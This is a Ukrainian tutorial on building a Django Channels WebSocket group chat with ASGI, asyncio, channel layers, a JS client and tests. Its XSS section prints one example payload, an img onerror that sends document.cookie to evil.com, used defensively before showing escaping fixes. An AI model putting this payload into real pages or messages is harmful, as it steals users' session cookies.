# Туторіал 07 — Async, ASGI та WebSocket чат

**Мета:** зрозуміти чому HTTP не підходить для real-time, як WebSocket вирішує цю проблему, що таке asyncio event loop, і як Django Channels реалізує груповий чат у notes_chat_app.

---

## Зміст

1. [Чому HTTP не підходить для чату](#чому-http-не-підходить-для-чату)
2. [WebSocket — постійне двостороннє з'єднання](#websocket--постійне-двостороннє-зєднання)
3. [asyncio — event loop і coroutines](#asyncio--event-loop-і-coroutines)
4. [Sync vs Async — де різниця реальна](#sync-vs-async--де-різниця-реальна)
5. [Архітектура ASGI стеку](#архітектура-asgi-стеку)
6. [asgi.py — точка входу](#asgipy--точка-входу)
7. [routing.py — WebSocket URL patterns](#routingpy--websocket-url-patterns)
8. [settings.py — Channel Layers і Daphne](#settingspy--channel-layers-і-daphne)
9. [Consumer — lifecycle та методи](#consumer--lifecycle-та-методи)
10. [database_sync_to_async — ORM у async context](#database_sync_to_async--orm-у-async-context)
11. [Async ORM методи Django 4.1+](#async-orm-методи-django-41)
12. [Channel layer — як доставляє до всіх](#channel-layer--як-доставляє-до-всіх)
13. [InMemory vs Redis channel layer](#inmemory-vs-redis-channel-layer)
14. [Повна реалізація GroupChatConsumer](#повна-реалізація-groupchatconsumer)
15. [WebSocket JS клієнт](#websocket-js-клієнт)
16. [XSS захист](#xss-захист)
17. [Тестування consumers](#тестування-consumers)
18. [Типові помилки](#типові-помилки)
19. [Практичне завдання](#практичне-завдання)
20. [Чеклист самоперевірки](#чеклист-самоперевірки)

---

## Чому HTTP не підходить для чату

HTTP — протокол "запит → відповідь → з'єднання закрито". Сервер **не може** надіслати повідомлення браузеру без запиту від браузера.

```
HTTP (класичний):
  Browser ── GET /chat/ ──► Django view → HttpResponse → [з'єднання закрито]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [з'єднання закрито]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [з'єднання закрито]
  (кожного разу нове з'єднання — сервер мовчить між запитами)
```

### Два костильних варіанти для чату

| Підхід | Як працює | Проблема |
|--------|-----------|----------|
| **Polling** | Браузер запитує `/new-messages/` кожні 2 секунди | 1000 юзерів = 500 req/s. Повідомлення приходить із затримкою до 2 сек |
| **Long polling** | Браузер надсилає запит, сервер тримає відкритим до нового повідомлення | 1000 юзерів = 1000 заблокованих threads |
| **Server-Sent Events** | Однобічний потік від сервера до браузера | Не двосторонній (браузер не може надсилати) |

### Sync Django + Long polling = проблема масштабування

```
Sync Django thread pool:
  Типово: 4–16 worker threads (gunicorn/wsgi)
  
  1000 юзерів у чаті → 1000 потоків заблоковані в очікуванні повідомлення
  Thread pool вичерпаний → решта сайту (форми, нотатки, логін) не відповідає
  Кожен блокований thread: ~8 MB RAM на stack → 1000 юзерів = ~8 GB RAM тільки на threads
```

Саме тому для чату потрібен принципово інший підхід: постійне з'єднання + async.

---

## WebSocket — постійне двостороннє з'єднання

WebSocket встановлюється через HTTP Upgrade handshake **один раз**, після чого відкрите TCP-з'єднання живе до закриття вкладки.

### Handshake

```
1. Браузер: GET /ws/groups/7/chat/ HTTP/1.1
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

2. Сервер:  HTTP/1.1 101 Switching Protocols
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. Після цього — не HTTP, а WebSocket frames (бінарний протокол поверх TCP)
```

### Flow після встановлення

```
WebSocket (після handshake):
  Browser ════════════ PERSISTENT TCP ════════════ Server
  ↑ Будь-яка сторона може надіслати дані в будь-який момент

  Viktor: ws.send({content: "Привіт!"}) ──────────► consumer.receive()
                                                          │
                                                     group_send()
                                                          │
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Оля
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Маша
          ws.onmessage ◄── consumer.send() ◄─────────────┘ Віктор
```

### Браузерний WebSocket API

```javascript
// Вбудований у браузер — жодних бібліотек не потрібно
const ws = new WebSocket('ws://localhost/ws/groups/7/chat/')

ws.onopen = () => {
    console.log('Підключено до чату')
}

ws.onmessage = (event) => {
    const data = JSON.parse(event.data)
    console.log('Нове повідомлення:', data)
}

ws.onclose = (event) => {
    // event.code:
    //   1000 — нормальне закриття
    //   1006 — аварійне (інтернет обірвався)
    //   4003 — custom code (наш: not a member)
    console.log(`З'єднання закрито: ${event.code}`)
}

ws.onerror = (error) => {
    console.error('WS помилка:', error)
}

ws.send(JSON.stringify({ content: 'Привіт!' }))
ws.close()
```

---

## asyncio — event loop і coroutines

Щоб зрозуміти Django Channels, потрібно розуміти asyncio — стандартну бібліотеку Python для асинхронного програмування.

### Event loop — серце async Python

```python
import asyncio

# Event loop — "планувальник" coroutines
# НЕ паралельне виконання (не threading)
# Cooperative multitasking: задачі добровільно поступаються через await

asyncio.run(main())
```

```
Event loop — один потік, багато coroutines:

  ┌──────────────────────────────────────────────────────────┐
  │  Task 1: fetch(url_a) ──── await ──→ PAUSE               │
  │  Task 2: fetch(url_b) ──── await ──→ PAUSE               │
  │  Task 3: fetch(url_c) ──── await ──→ PAUSE               │
  │                                                           │
  │  I/O готовий для Task 1 → RESUME Task 1                  │
  │  I/O готовий для Task 3 → RESUME Task 3                  │
  │  I/O готовий для Task 2 → RESUME Task 2                  │
  └──────────────────────────────────────────────────────────┘

  ≠ Threading (паралельне виконання у кількох OS потоках)
  = Cooperative multitasking (один потік, перемикання через await)
```

### Coroutine vs звичайна функція

```python
# Звичайна функція — виконується до кінця без зупинки
def sync_fetch(url):
    response = requests.get(url)   # блокує потік на весь час запиту
    return response.text

# Coroutine — може призупинитись і поступитись event loop
async def async_fetch(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.text()  # тут поступається event loop
```

### await — де відбувається перемикання

```python
async def handler():
    # await = "запустити async операцію і поступитись event loop"
    result = await some_async_operation()
    
    # CPU код — event loop НЕ переключається тут
    processed = process(result)
    
    return processed
```

### asyncio.gather — паралельні операції

```python
async def fetch_all():
    # Запускає три задачі "одночасно" (concurrent, не parallel)
    results = await asyncio.gather(
        fetch(url_1),
        fetch(url_2),
        fetch(url_3),
    )
    # Якщо кожен fetch займає 1 сек → загалом ~1 сек (не 3)
    return results
```

---

## Sync vs Async — де різниця реальна

### Порівняння моделей

| | Sync (WSGI/Gunicorn) | Async (ASGI/Uvicorn) |
|--|----------------------|----------------------|
| **Модель** | Thread per request | Event loop + coroutines |
| **1000 з'єднань** | 1000 OS threads (~8 GB RAM) | 1000 coroutines (~кілька MB) |
| **CPU поки немає повідомлень** | Thread заблокований і "спить" | Event loop обслуговує інших |
| **Складність коду** | Простіша (sync Python) | Складніша (async/await скрізь) |
| **Ризики** | Thread exhaustion | Блокуючі виклики у async context |

### Async не завжди краще

```
Sync Django: CRUD нотаток, форм, авторизації
  → sync повністю підходить
  → перехід на async: ускладнює код, нічого не дає

Async Django Channels: 1000 одночасних WS-з'єднань у чаті
  → sync неможливий (thread exhaustion)
  → async — єдиний правильний підхід
```

**Правило:** async виправданий для **long-lived з'єднань** і **high-concurrency I/O**. Для звичайного CRUD — зайве ускладнення.

### Що у notes_chat_app async, а що sync

| Функціонал | Реалізація | Чому |
|------------|-----------|------|
| Нотатки, Notebooks, Tags | Sync views | Простий CRUD, короткі запити |
| TodoList, ShoppingList | Sync views | Прості мутації |
| Авторизація (login/register) | Sync views | Стандартна Django auth |
| Груповий чат | `AsyncWebsocketConsumer` | WS = тисячі довготривалих з'єднань |

---

## Архітектура ASGI стеку

```
Браузер (HTTP)          Браузер (WebSocket)
      │                        │
      ▼                        ▼
   nginx :80  (reverse proxy — передає далі)
      │                        │
      ▼                        ▼
   Uvicorn ASGI :8001  (один процес — обидва протоколи)
      │
      ▼
   ProtocolTypeRouter  (notes_project/asgi.py)
      │
      ├── protocol == "http"
      │       ▼
      │   Django HTTP app (views.py, urls.py, templates)
      │
      └── protocol == "websocket"
              ▼
          AuthMiddlewareStack
              ▼
          WebSocket URLRouter  (notes_project/routing.py)
              ▼
          GroupChatConsumer  (notes_app/consumers.py)
              │
              ├──► PostgreSQL (через database_sync_to_async)
              └──► InMemoryChannelLayer / RedisChannelLayer (pub/sub)
```

| Компонент | Роль | Аналог в HTTP Django |
|-----------|------|---------------------|
| `ProtocolTypeRouter` | Розрізняє HTTP і WS за protocol type | `ROOT_URLCONF` |
| `AuthMiddlewareStack` | Читає session cookie → `scope['user']` | `@login_required` decorator |
| `WebSocket URLRouter` | Маршрутизує WS URL до Consumer | `urls.py` |
| `GroupChatConsumer` | Обробляє WS-з'єднання весь час | `view` (але живе довше) |
| `InMemoryChannelLayer` | Pub/sub broadcast між consumers | _(немає прямого аналога)_ |

---

## asgi.py — точка входу

```python
# notes_project/asgi.py
import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'notes_project.settings')

# CRITICAL: get_asgi_application() ПЕРЕД будь-яким імпортом з notes_app
# Django app registry (AppConfig.ready()) має бути ініціалізований
# ПЕРЕД тим як importувати моделі або consumers.
# Якщо поміняти порядок → AppRegistryNotReady exception.
django_asgi_app = get_asgi_application()

# Тільки після get_asgi_application() — безпечно імпортувати з notes_app
from notes_project.routing import websocket_urlpatterns

application = ProtocolTypeRouter({
    # HTTP → звичайний Django (views.py, templates, static)
    "http": django_asgi_app,

    # WebSocket → Auth middleware → URL router → Consumer
    "websocket": AuthMiddlewareStack(
        URLRouter(websocket_urlpatterns)
    ),
})
```

### Що робить AuthMiddlewareStack

```
WebSocket handshake request:
  GET /ws/groups/7/chat/
  Cookie: sessionid=abc123xyz

AuthMiddlewareStack:
  1. Читає sessionid cookie з заголовків handshake
  2. Знаходить сесію в Django session backend (БД)
  3. Завантажує User з сесії
  4. Кладе у scope['user']

Consumer:
  self.user = self.scope['user']
  # → User object (або AnonymousUser якщо не залогінений)
```

---

## routing.py — WebSocket URL patterns

```python
# notes_project/routing.py
from django.urls import re_path
from notes_app import consumers

websocket_urlpatterns = [
    re_path(
        r'^ws/groups/(?P<group_pk>\d+)/chat/$',
        consumers.GroupChatConsumer.as_asgi(),
    ),
]

# URL: ws://host/ws/groups/7/chat/
# group_pk=7 → scope['url_route']['kwargs']['group_pk']
```

### re_path vs path для WebSocket

```python
# path() — простіший:
from django.urls import path
websocket_urlpatterns = [
    path('ws/groups/<int:group_pk>/chat/', consumers.GroupChatConsumer.as_asgi()),
]

# re_path() — regex, більше контролю:
from django.urls import re_path
websocket_urlpatterns = [
    re_path(r'^ws/groups/(?P<group_pk>\d+)/chat/$', consumers.GroupChatConsumer.as_asgi()),
]

# Обидва варіанти працюють.
# re_path — традиційний вибір для WebSocket (більше прикладів у документації)
```

---

## settings.py — Channel Layers і Daphne

```python
# notes_project/settings.py

INSTALLED_APPS = [
    'daphne',        # ← ПЕРШИЙ у списку! Обов'язково перед 'django.contrib.*'
    'channels',      # Django Channels
    'django.contrib.admin',
    # ... решта apps
    'notes_app',
]

# ASGI application (замість WSGI_APPLICATION для Channels)
ASGI_APPLICATION = 'notes_project.asgi.application'

# Channel Layer — вибір залежно від середовища
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    # Docker / Production: RedisChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,
                    # socket_timeout=None — КРИТИЧНО для idle WS з'єднань
                    # Без цього channels_redis встановлює socket_timeout=5
                    # і brpop_timeout=5 конфліктують → TimeoutError після простою
                    "socket_timeout": None,
                    "socket_connect_timeout": 5,
                    # Перевіряє Redis кожні 30 сек — запобігає silent disconnect
                    "health_check_interval": 30,
                }],
            },
        }
    }
else:
    # Local dev (без Redis): InMemoryChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels.layers.InMemoryChannelLayer",
        }
    }
```

### Чому `daphne` першим у INSTALLED_APPS

```python
# Без 'daphne' першим:
$ python manage.py runserver
# → Django запускає вбудований WSGI сервер
# → WebSocket не працює (WSGI не підтримує WS)

# З 'daphne' першим:
$ python manage.py runserver
# → Daphne override runserver → запускає ASGI сервер
# → WebSocket працює

# У production (Docker) використовуємо uvicorn напряму:
# exec python -m uvicorn notes_project.asgi:application --host 0.0.0.0 --port 8001
# → daphne перший у INSTALLED_APPS потрібен тільки для локального runserver
```

---

## Consumer — lifecycle та методи

Consumer — аналог view, але:
- Живе весь час з'єднання (не один запит)
- Виконується як async coroutine
- Обробляє події: connect, receive, disconnect, channel layer events

### ASCII lifecycle diagram

```
Браузер відкриває вкладку чату:
  ┌─────────────────────────────────────────────────┐
  │ 1. connect()                                     │
  │    ├── перевіряє авторизацію (is_authenticated) │
  │    ├── перевіряє membership                      │
  │    ├── group_add() → підписується на channel     │
  │    ├── accept() → підтверджує WS з'єднання       │
  │    └── send() history × N повідомлень            │
  │                                                   │
  │ 2. receive() ← браузер надіслав повідомлення     │
  │    ├── валідує content                            │
  │    ├── save_message() → PostgreSQL               │
  │    └── group_send() → broadcast до всіх          │
  │                 │                                 │
  │ 3. chat_message() ← channel layer доставив       │
  │    └── send() → надсилає до браузера             │
  │                                                   │
  │    (2 і 3 повторюються N разів)                  │
  │                                                   │
  │ 4. disconnect()                                   │
  │    └── group_discard() → відписується            │
  └─────────────────────────────────────────────────┘
```

### Різниця між receive() і chat_message()

```
receive()      — браузер ЦЬОГО з'єднання надіслав повідомлення
chat_message() — channel layer доставив broadcast від будь-якого учасника

Коли Оля надсилає "Привіт":
  Consumer Олі:     receive() → group_send("chat_group_7", {...})
  Consumer Олі:     chat_message() ← channel layer → send() → браузер Олі
  Consumer Маші:    chat_message() ← channel layer → send() → браузер Маші
  Consumer Віктора: chat_message() ← channel layer → send() → браузер Віктора
```

---

## database_sync_to_async — ORM у async context

Django ORM — синхронний. Виконання sync коду напряму в async context блокує event loop і піднімає `SynchronousOnlyOperation`.

### Принцип роботи

```python
# ❌ НЕПРАВИЛЬНО — SynchronousOnlyOperation:
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)
    # ↑ sync ORM у async context → блокує event loop → виняток

# ✅ ПРАВИЛЬНО — @database_sync_to_async:
@database_sync_to_async
def check_membership(self, group_pk, user):
    # Звичайна sync def
    # @database_sync_to_async запускає її у Django thread pool
    # Event loop вільний поки thread виконує SQL
    try:
        group = Group.objects.get(pk=group_pk)
        return group.user_set.filter(pk=user.pk).exists()
    except Group.DoesNotExist:
        return False

async def connect(self):
    is_member = await self.check_membership(self.group_pk, self.user)
    # await = "запусти у thread pool і чекай результат без блокування event loop"
```

### Як працює під капотом

```
Event loop (один потік):
  coroutine connect() виконується...
  
  → зустрічає: await self.check_membership(...)
  → @database_sync_to_async: Submit до thread pool executor
  → Event loop: продовжує обслуговувати ІНШІ з'єднання
  
Thread pool (окремий потік):
  → виконує sync Django ORM query (SELECT ... FROM ...)
  → повертає результат
  
Event loop:
  → отримує результат з thread pool
  → продовжує coroutine connect() з наступного рядка
```

### Критично: повертати list, не QuerySet

```python
# ❌ НЕПРАВИЛЬНО — QuerySet lazy, ітерується у async context:
@database_sync_to_async
def load_history(self, group_pk):
    return ChatMessage.objects.filter(group_id=group_pk).values(...)
    # QuerySet не виконав SQL! SQL виконається при ітерації.
    # Ітерація відбудеться в async context → SynchronousOnlyOperation

# ✅ ПРАВИЛЬНО — list() форсує SQL у worker thread:
@database_sync_to_async
def load_history(self, group_pk):
    qs = (
        ChatMessage.objects
        .filter(group_id=group_pk)
        .select_related('author')
        .order_by('-timestamp')[:50]
    )
    messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
    # list() виконує SQL ТУТ, у worker thread
    messages.reverse()  # хронологічний порядок
    return messages      # Python list — безпечно повертати
```

### database_sync_to_async як inline wrapper

```python
# Спосіб 1: decorator (найчастіше)
@database_sync_to_async
def save_message(self, group_pk, user, content):
    return ChatMessage.objects.create(group_id=group_pk, author=user, content=content)

# Спосіб 2: inline wrapper (для одноразових операцій)
async def receive(self, text_data):
    msg = await database_sync_to_async(ChatMessage.objects.create)(
        group_id=self.group_pk,
        author=self.user,
        content=content,
    )
```

---

## Async ORM методи Django 4.1+

Django 4.1 додав нативні async методи ORM. В async views вони зручніші ніж `database_sync_to_async`.

| Sync метод | Async аналог | Що робить |
|------------|-------------|-----------|
| `qs.filter(...).first()` | `await qs.filter(...).afirst()` | Перший результат або None |
| `qs.get(pk=x)` | `await qs.aget(pk=x)` | Один об'єкт або DoesNotExist |
| `qs.count()` | `await qs.acount()` | Кількість рядків |
| `Model.objects.create(...)` | `await Model.objects.acreate(...)` | Створення запису |
| `qs.update(...)` | `await qs.aupdate(...)` | Масове оновлення |
| `qs.delete()` | `await qs.adelete()` | Масове видалення |
| `obj.save()` | `await obj.asave()` | Збереження об'єкта |
| `obj.delete()` | `await obj.adelete()` | Видалення об'єкта |
| `for obj in qs:` | `async for obj in qs:` | Ітерація по QuerySet |
| `qs.exists()` | `await qs.aexists()` | Чи є хоч один |

```python
# Async view — нативні async методи:
async def note_list(request):
    notes = [n async for n in Note.objects.filter(user=request.user).select_related('notebook')]
    return render(request, 'notes/list.html', {'notes': notes})

async def note_detail(request, pk):
    try:
        note = await Note.objects.aget(pk=pk, user=request.user)
    except Note.DoesNotExist:
        raise Http404
    return render(request, 'notes/detail.html', {'note': note})
```

**У Consumer використовуй `@database_sync_to_async`** — він дозволяє виконати кілька ORM операцій в одному thread pool виклику і краще контролює транзакції.

---

## Channel layer — як доставляє до всіх

### Концепція pub/sub

```
Channel layer — message bus для Django Channels.
Кожен Consumer підписується на "group" (named channel).
group_send() → доставляє до ВСІХ підписників групи.

Стан channel layer для чату групи 7:
  Group "chat_group_7":
    ├── Consumer Віктора (channel_name: "specific.abc123")
    ├── Consumer Олі     (channel_name: "specific.def456")
    └── Consumer Маші    (channel_name: "specific.ghi789")
```

### group_send flow

```
Віктор надсилає "Привіт":

1. Consumer Віктора: receive("Привіт")
2. Consumer Віктора: group_send("chat_group_7", {
       'type': 'chat_message',
       'author': 'Viktor',
       'content': 'Привіт',
       'timestamp': '2025-01-01T12:00:00',
   })

3. Channel layer знаходить групу "chat_group_7"
   → Consumer Віктора: chat_message(event) → send() → браузер Віктора
   → Consumer Олі:     chat_message(event) → send() → браузер Олі
   → Consumer Маші:    chat_message(event) → send() → браузер Маші

Результат: "Привіт" з'являється одночасно у всіх трьох браузерах.
```

### type → метод mapping

```python
# 'type' у group_send → назва методу у Consumer
# Крапка → підкреслення:

group_send(room, {'type': 'chat_message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'chat.message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'user.joined', ...})   → Consumer.user_joined(event)
group_send(room, {'type': 'typing.indicator', ...}) → Consumer.typing_indicator(event)
```

---

## InMemory vs Redis channel layer

### InMemoryChannelLayer (dev)

```python
CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}
```

| Властивість | InMemory |
|-------------|----------|
| Залежності | Жодних (вбудований у channels) |
| Масштабування | Тільки один process |
| Персистентність | Зникає при restart |
| Для | Локальна розробка, unit тести |

**Обмеження InMemory:** при кількох Uvicorn workers — кожен має свій InMemoryChannelLayer. Consumers у різних workers не бачать повідомлення одне одного.

### RedisChannelLayer (production)

```python
CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels_redis.core.RedisChannelLayer",
        "CONFIG": {
            "hosts": [{
                "address": "redis://redis:6379/0",
                "socket_timeout": None,
                "socket_connect_timeout": 5,
                "health_check_interval": 30,
            }],
        },
    }
}
```

| Властивість | Redis |
|-------------|-------|
| Залежності | Redis сервер, channels_redis пакет |
| Масштабування | Необмежено (shared Redis між workers) |
| Персистентність | Messages персистентні в Redis до доставки |
| Для | Production, Docker Compose |

### Чому socket_timeout=None

```
Проблема:
  channels_redis за замовчуванням: socket_timeout=5 (5 секунд)
  channels_redis використовує Redis BRPOP з timeout=5
  
  При idle WebSocket (ніхто не пише > 5 сек):
    BRPOP timeout → channels_redis піднімає TimeoutError
    → Consumer отримує exception → WS з'єднання закривається
    → Юзер бачить: "З'єднання втрачено"

Рішення:
  socket_timeout=None → aioredis не має socket timeout
  BRPOP може чекати необмежено
  health_check_interval=30 підтримує з'єднання живим (ping кожні 30 сек)
  nginx proxy_read_timeout=300s → nginx не закриє WS раніше 5 хвилин
```

---

## Повна реалізація GroupChatConsumer

```python
# notes_app/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group


class GroupChatConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer для групового чату.

    URL: /ws/groups/<group_pk>/chat/

    Client → Server:
        {"content": "Текст повідомлення"}

    Server → Client (history):
        {"type": "history", "author": "...", "content": "...", "timestamp": "..."}

    Server → Client (live):
        {"type": "message", "author": "...", "content": "...", "timestamp": "..."}
    """

    async def connect(self):
        self.user = self.scope['user']

        # 1. Авторизація
        if not self.user.is_authenticated:
            await self.close(code=4001)
            return

        # 2. group_pk з URL kwargs
        self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

        # 3. Membership check (ORM у worker thread)
        is_member = await self.check_membership(self.group_pk, self.user)
        if not is_member:
            await self.close(code=4003)
            return

        # 4. Channel group name
        self.room_group_name = f"chat_group_{self.group_pk}"

        # 5. Підписуємось на channel group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name,
        )

        # 6. Приймаємо з'єднання
        await self.accept()

        # 7. Надсилаємо history
        history = await self.load_history(self.group_pk)
        for msg in history:
            await self.send(text_data=json.dumps({
                'type': 'history',
                'author': msg['author__username'],
                'content': msg['content'],
                'timestamp': msg['timestamp'].isoformat(),
            }))

    async def receive(self, text_data):
        try:
            data = json.loads(text_data)
        except json.JSONDecodeError:
            return

        content = data.get('content', '').strip()

        if not content:
            return
        if len(content) > 2000:
            await self.send(text_data=json.dumps({
                'type': 'error',
                'message': 'Повідомлення занадто довге (максимум 2000 символів)',
            }))
            return

        msg = await self.save_message(self.group_pk, self.user, content)

        await self.channel_layer.group_send(
            self.room_group_name,
            {
                'type': 'chat_message',
                'author': self.user.username,
                'content': content,
                'timestamp': msg.timestamp.isoformat(),
            }
        )

    async def chat_message(self, event):
        await self.send(text_data=json.dumps({
            'type': 'message',
            'author': event['author'],
            'content': event['content'],
            'timestamp': event['timestamp'],
        }))

    async def disconnect(self, close_code):
        # hasattr check: якщо connect() завершився до group_add
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(
                self.room_group_name,
                self.channel_name,
            )

    # ─── ORM helpers ─────────────────────────────────────────────────

    @database_sync_to_async
    def check_membership(self, group_pk, user):
        try:
            group = Group.objects.get(pk=group_pk)
            return group.user_set.filter(pk=user.pk).exists()
        except Group.DoesNotExist:
            return False

    @database_sync_to_async
    def load_history(self, group_pk):
        from notes_app.models import ChatMessage
        qs = (
            ChatMessage.objects
            .filter(group_id=group_pk)
            .select_related('author')
            .order_by('-timestamp')[:50]
        )
        messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
        messages.reverse()
        return messages

    @database_sync_to_async
    def save_message(self, group_pk, user, content):
        from notes_app.models import ChatMessage
        return ChatMessage.objects.create(
            group_id=group_pk,
            author=user,
            content=content,
        )
```

---

## WebSocket JS клієнт

```javascript
// notes_app/static/notes_app/js/group_chat.js

document.addEventListener('DOMContentLoaded', function () {
    const container = document.getElementById('chat-container');
    const groupPk = container.dataset.groupPk;
    const messagesDiv = document.getElementById('chat-messages');
    const messageInput = document.getElementById('message-input');
    const sendButton = document.getElementById('send-button');

    // ws:// для HTTP, wss:// для HTTPS (ngrok)
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/groups/${groupPk}/chat/`;

    let ws = null;
    let reconnectAttempts = 0;
    const MAX_RECONNECT = 5;

    function connect() {
        ws = new WebSocket(wsUrl);

        ws.onopen = function () {
            reconnectAttempts = 0;
            sendButton.disabled = false;
            updateStatus('connected', 'Підключено');
        };

        ws.onmessage = function (event) {
            const data = JSON.parse(event.data);
            if (data.type === 'history' || data.type === 'message') {
                addMessage(data);
            } else if (data.type === 'error') {
                showError(data.message);
            }
        };

        ws.onclose = function (event) {
            sendButton.disabled = true;

            // Custom close codes — не перепідключатись
            if (event.code === 4001 || event.code === 4003) {
                updateStatus('error', 'Доступ заборонено');
                return;
            }

            if (reconnectAttempts < MAX_RECONNECT) {
                reconnectAttempts++;
                const delay = Math.min(1000 * reconnectAttempts, 5000);
                updateStatus('reconnecting', `Перепідключення (${reconnectAttempts}/${MAX_RECONNECT})...`);
                setTimeout(connect, delay);
            } else {
                updateStatus('error', 'Помилка підключення. Перезавантажте сторінку.');
            }
        };
    }

    function sendMessage() {
        const content = messageInput.value.trim();
        if (!content || !ws || ws.readyState !== WebSocket.OPEN) return;
        ws.send(JSON.stringify({ content: content }));
        messageInput.value = '';
        messageInput.focus();
    }

    sendButton.addEventListener('click', sendMessage);

    messageInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });

    function addMessage(data) {
        const wrapper = document.createElement('div');
        wrapper.className = 'chat-message';
        // escapeHtml() — ОБОВ'ЯЗКОВО для XSS захисту
        wrapper.innerHTML = `
            <span class="chat-author">${escapeHtml(data.author)}</span>
            <span class="chat-time">${formatTime(data.timestamp)}</span>
            <div class="chat-content">${escapeHtml(data.content)}</div>
        `;
        messagesDiv.appendChild(wrapper);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.appendChild(document.createTextNode(text));
        return div.innerHTML;
    }

    function formatTime(isoString) {
        return new Date(isoString).toLocaleTimeString('uk-UA', {
            hour: '2-digit', minute: '2-digit',
        });
    }

    function updateStatus(type, message) {
        const el = document.getElementById('connection-status');
        if (el) { el.textContent = message; el.className = `status-${type}`; }
    }

    function showError(message) {
        const el = document.createElement('div');
        el.className = 'alert alert-warning';
        el.textContent = message;
        messagesDiv.appendChild(el);
        setTimeout(() => el.remove(), 5000);
    }

    connect();
});
```

### Шаблон чату

```html
{# notes_app/templates/notes_app/group_chat.html #}
{% extends "layouts/dashboard.html" %}
{% load static %}

{% block content %}
<div id="chat-container"
     data-group-pk="{{ group.pk }}"
     class="d-flex flex-column"
     style="height: 80vh;">

  <h2>{{ group.name }} — Чат</h2>

  <div id="connection-status" class="mb-2 text-muted small">Підключення...</div>

  <div id="chat-messages"
       class="flex-grow-1 overflow-auto border rounded p-3 mb-2 bg-light">
  </div>

  <div class="input-group">
    <input id="message-input"
           type="text"
           class="form-control"
           placeholder="Введіть повідомлення... (Enter — надіслати)"
           maxlength="2000">
    <button id="send-button" class="btn btn-primary" disabled>
      Надіслати
    </button>
  </div>
</div>
{% endblock %}

{% block extra_js %}
<script src="{% static 'notes_app/js/group_chat.js' %}"></script>
{% endblock %}
```

---

## XSS захист

Чат показує контент від інших юзерів — класична точка XSS атаки.

### Вектор атаки

```
Зловмисник надсилає в чат:
  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

Якщо JS клієнт вставляє через innerHTML без escaping:
  div.innerHTML = data.content  ← НЕБЕЗПЕЧНО

→ Браузер парсить HTML → img не завантажується → onerror спрацьовує
→ fetch() відправляє cookies на evil.com → сесії вкрадені
```

### Три безпечних варіанти

```javascript
// ✅ Метод 1: textContent (тільки текст, HTML не парситься)
messageDiv.textContent = data.content

// ✅ Метод 2: createTextNode
messageDiv.appendChild(document.createTextNode(data.content))

// ✅ Метод 3: escapeHtml() перед innerHTML (якщо потрібна HTML верстка)
function escapeHtml(text) {
    const div = document.createElement('div')
    div.appendChild(document.createTextNode(text))
    return div.innerHTML
    // & → &amp;  < → &lt;  > → &gt;  " → &quot;
}
wrapper.innerHTML = `<strong>${escapeHtml(data.author)}</strong>: ${escapeHtml(data.content)}`
```

**У notes_chat_app** використовуємо метод 3 (`escapeHtml`) — нам потрібна HTML верстка повідомлення (автор, час, контент у різних елементах).

---

## Тестування consumers

### Базова структура тесту

```python
# notes_app/tests/test_consumers.py
import json
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import User, Group
from django.test import TransactionTestCase, override_settings

from notes_project.asgi import application

TEST_CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}


def _make_session_cookie(user):
    """Хелпер: створює session cookie для user."""
    from importlib import import_module
    from django.conf import settings

    engine = import_module(settings.SESSION_ENGINE)
    session = engine.SessionStore()
    if user:
        session[settings.AUTH_USER_SESSION_KEY] = user.pk
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = user.get_session_auth_hash()
    session.save()
    return session.session_key


@override_settings(CHANNEL_LAYERS=TEST_CHANNEL_LAYERS)
class GroupChatConsumerTest(TransactionTestCase):
    # TransactionTestCase, а не TestCase:
    # WebsocketCommunicator відкриває окремий потік для consumer.
    # TestCase огортає кожен тест у транзакцію — consumer з іншого потоку
    # не бачить ці незакомічені дані → setUp-об'єкти «зникають».
    # TransactionTestCase не загортає у транзакцію → дані видимі всім потокам.

    def setUp(self):
        # setUp() — синхронний, навіть якщо тести async.
        # ORM-виклики виконуємо напряму: setUp() ніколи не запускається
        # в async-контексті, тому database_sync_to_async не потрібний.
        self.user = User.objects.create_user('testuser', password='testpass123')
        self.other_user = User.objects.create_user('otheruser', password='testpass123')
        self.group = Group.objects.create(name='Test Group')
        self.group.user_set.add(self.user)

